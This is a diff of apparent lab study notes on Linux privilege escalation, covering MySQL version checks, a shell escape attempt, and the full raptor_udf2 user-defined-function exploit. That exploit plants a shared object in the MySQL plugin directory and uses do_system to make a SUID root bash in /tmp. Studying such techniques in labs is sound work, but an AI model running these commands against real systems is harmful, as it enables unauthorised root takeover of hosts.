@@ -135,27 +135,28 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 ## CATEGORY "SERVICES" - SERVICE EXPLOITS
 check mysql database version
 ```
+mysql -V
+mysql --version
+mysql -u root -p
 mysql> show variables like '%version%';
-$ mysql -V
-$ mysql --version
 ```
-mysql is running as root, but with this root access we cannot get root access using shell escape technique
+MySQL is running as root, but with this root access, we cannot get root access using the shell escape technique.
 ```
 mysql -u root -p
-\! sh
+mysql> \! sh
 ```
-exploit POC is as follows
+exploit POC is as follows:
 ```
 cd /home/user/tools/mysql-udf
 gcc -g -c raptor_udf2.c -fPIC
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 mysql -u root
 use mysql;
-create table foo(line blob);
-insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
-select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
-create function do_system returns integer soname 'raptor_udf2.so';
-select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 /tmp/rootbash -p
 rm /tmp/rootbash
 exit
